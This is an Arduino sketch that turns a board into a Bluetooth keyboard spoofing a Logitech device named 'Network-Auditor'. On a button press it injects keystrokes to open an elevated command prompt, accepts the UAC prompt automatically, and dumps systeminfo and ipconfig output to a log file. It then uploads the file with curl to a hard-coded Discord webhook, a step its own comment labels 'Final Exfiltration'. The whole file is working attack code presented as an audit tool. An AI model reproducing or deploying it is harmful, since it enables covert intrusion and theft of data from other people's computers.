#include <BleKeyboard.h>
BleKeyboard bleKeyboard("Network-Auditor", "Logitech", 100);

// CUSTOM FUNCTION: Optimized speed for Asus TUF (110ms total per char)
void typeSafe(String text) {
  for(int i=0; i < text.length(); i++) {
    bleKeyboard.press(text[i]);
    delay(30); // Key down duration
    bleKeyboard.releaseAll();
    delay(80); // Wait for buffer to clear
  }
}

void setup() {
  pinMode(0, INPUT_PULLUP);
  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected() && digitalRead(0) == LOW) {
    delay(1500); 

    // 1. Open Administrative CMD
    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.press('r'); delay(150); bleKeyboard.releaseAll();
    delay(1000);
    typeSafe("cmd");
    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_SHIFT); bleKeyboard.press(KEY_RETURN);
    delay(150); bleKeyboard.releaseAll();
    delay(2500); // UAC Wait
    bleKeyboard.press(KEY_LEFT_ALT); bleKeyboard.press('y'); delay(150); bleKeyboard.releaseAll();
    delay(1500);

    // 2. Audit Commands (Network + System)
    typeSafe("mkdir C:\\Klog");
    bleKeyboard.write(KEY_RETURN);
    delay(300);
    
    // System info capture
    typeSafe("systeminfo > C:\\Klog\\log.txt");
    bleKeyboard.write(KEY_RETURN);
    delay(3000); 

    // Network info (MAC/IP) append
    typeSafe("ipconfig /all >> C:\\Klog\\log.txt");
    bleKeyboard.write(KEY_RETURN);
    delay(1500);

    // 3. Final Exfiltration to Discord
    String url = "https://discord.com/api/webhooks/1466450537057615923/ZHjR5aI1VDQzpNcpK0eGjBuvs1V3juMT9xNVtFIe0U4VRboAH6JqjTFru0r-VYZPTY4w";
    typeSafe("curl -X POST -F \"file=@C:/Klog/log.txt\" " + url);
    bleKeyboard.write(KEY_RETURN);
    
    delay(4000); // Upload wait
    typeSafe("exit");
    bleKeyboard.write(KEY_RETURN);

    while(digitalRead(0) == LOW) { delay(10); }
  }
}